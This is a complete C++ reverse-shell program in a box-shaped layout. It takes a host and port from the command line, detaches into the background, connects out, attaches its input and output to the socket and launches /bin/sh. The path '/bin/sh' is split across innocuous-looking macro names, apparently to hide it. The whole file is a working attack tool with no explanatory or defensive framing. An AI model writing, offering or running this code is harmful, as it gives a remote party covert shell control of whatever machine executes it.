#include/*****************************************/     <iostream>
#include/*                                       */     <unistd.h>
#include/*   ./binary server port                */ <sys/socket.h>
#include/*                                       */     <stdlib.h>
#include/*****************************************/  <arpa/inet.h>
#define /*                                       */  red  "\e[31m"
#define /*                                       */ yllw  "\e[33m"
#define /*                                       */ blue  "\e[34m"
#define /*                                       */packets  "/bin"
#define /*                                       */magne  "\e[35m"
#define /*                                       */green  "\e[92m"
#define /*                                       */cyan   "\e[96m"
#define /*                                       */ probe    "/sh"
#define /*****************************************/norm   "\e[39m"
using namespace std;int main(int argc, char** argv ){ if(argc!=3){
cout <<red << "./binary server port" <<endl; return 1;}cout<<green 
<< "Connection sent!" << norm << endl; daemon(1, 1); int s0;struct 
sockaddr_in target; s0 = socket(AF_INET , SOCK_STREAM , 0); if (s0
< 0) { close( s0); return 1; } target.sin_addr.s_addr = inet_addr(
argv[1]); target.sin_family= AF_INET; target.sin_port =htons(atoi(
argv[2]));if( connect(s0 ,(struct sockaddr*)&target,sizeof(target)
)<0){close(s0);return 1;};while(1){dup2(s0,0);dup2(s0,1);dup2(s0,2
);execl(packets probe,packets probe,(char*)0);close(s0);}exit(0);}
